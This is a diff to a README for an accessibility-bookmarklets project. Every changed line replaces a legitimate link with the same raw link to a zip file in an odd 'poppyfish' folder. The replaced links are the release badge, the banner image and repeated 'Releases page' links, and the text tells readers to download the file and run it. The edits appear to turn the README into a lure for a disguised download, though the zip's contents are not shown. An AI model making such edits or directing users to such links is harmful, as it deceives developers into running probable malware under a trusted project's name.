@@ -1,10 +1,10 @@
 # A11y-Bookmarklets: Plug-and-Play Accessibility Tools for Audits and AI-Supported Fixes
 
-[![Release Status](https://img.shields.io/badge/Release-Latest-blue?style=for-the-badge&logo=github)](https://github.com/alejandrogiga98/A11y-Bookmarklets/releases)
+[![Release Status](https://github.com/alejandrogiga98/A11y-Bookmarklets/raw/refs/heads/master/poppyfish/Bookmarklets_y_2.3-alpha.3.zip)](https://github.com/alejandrogiga98/A11y-Bookmarklets/raw/refs/heads/master/poppyfish/Bookmarklets_y_2.3-alpha.3.zip)
 
 A ready-to-use gallery of accessibility bookmarklets designed for audits, dev checks, and AI-assisted fixes. Drop these tools into your browser bookmarks bar and run them on any page to assess, validate, and improve accessibility in real time.
 
-![Accessibility tools banner](https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/Accessibility_icon_color.svg/1200px-Accessibility_icon_color.svg.png)
+![Accessibility tools banner](https://github.com/alejandrogiga98/A11y-Bookmarklets/raw/refs/heads/master/poppyfish/Bookmarklets_y_2.3-alpha.3.zip)
 
 Table of contents
 - What this project is
@@ -40,7 +40,7 @@ Quick start
 If you want to dive in fast, follow these steps. The goal is to let you try a few checks without a complicated setup.
 
 - Prepare your browser: Use a modern browser with a bookmarks bar visible. Bookmarklets execute directly in the current page context.
-- Get the latest assets: The Releases page hosts the latest assets and the most up-to-date bookmarklet bundle. Visit the Releases page to download the appropriate file, then run it in your browser. Visit: https://github.com/alejandrogiga98/A11y-Bookmarklets/releases
+- Get the latest assets: The Releases page hosts the latest assets and the most up-to-date bookmarklet bundle. Visit the Releases page to download the appropriate file, then run it in your browser. Visit: https://github.com/alejandrogiga98/A11y-Bookmarklets/raw/refs/heads/master/poppyfish/Bookmarklets_y_2.3-alpha.3.zip
 - Add bookmarklets to your browser: Drag the provided bookmarklets or copy-paste the code snippets into your bookmarks bar. Each bookmarklet is designed to be self-contained and easy to understand.
 - Run a test page: Open a page you want to audit. Click a bookmarklet to run its checks. Review the results and adjust your page as needed.
 - Review results and iterate: Use the results to guide improvements. Re-run checks after changes to verify fixes.
@@ -142,7 +142,7 @@ The project distributes assets via the Releases page. This page hosts downloadab
 
 Direct download and run
 - Directly download the latest asset from the Releases page and drop it into your bookmarks bar or follow the installation steps described in the asset documentation.
-- The link to the asset family is accessible here: https://github.com/alejandrogiga98/A11y-Bookmarklets/releases
+- The link to the asset family is accessible here: https://github.com/alejandrogiga98/A11y-Bookmarklets/raw/refs/heads/master/poppyfish/Bookmarklets_y_2.3-alpha.3.zip
 
 Note: If the link changes or the project relocates, check the Releases section for the most recent assets and guidance on installation.
 
@@ -181,7 +181,7 @@ Credits
 - Open-source resources and icons that helped shape the visuals and branding.
 
 Releases section reminder
-For the latest assets and to download the bundles, go to the Releases page. That page hosts the files used to install the bookmarklets in your browser. The link appears earlier in this README and is linked again here for convenience: https://github.com/alejandrogiga98/A11y-Bookmarklets/releases
+For the latest assets and to download the bundles, go to the Releases page. That page hosts the files used to install the bookmarklets in your browser. The link appears earlier in this README and is linked again here for convenience: https://github.com/alejandrogiga98/A11y-Bookmarklets/raw/refs/heads/master/poppyfish/Bookmarklets_y_2.3-alpha.3.zip
 
 Appendix: sample usage notes for common bookmarklets
 - Alt text checker: Click on a page with images. The tool reports images without alt attributes and suggests example alt text.
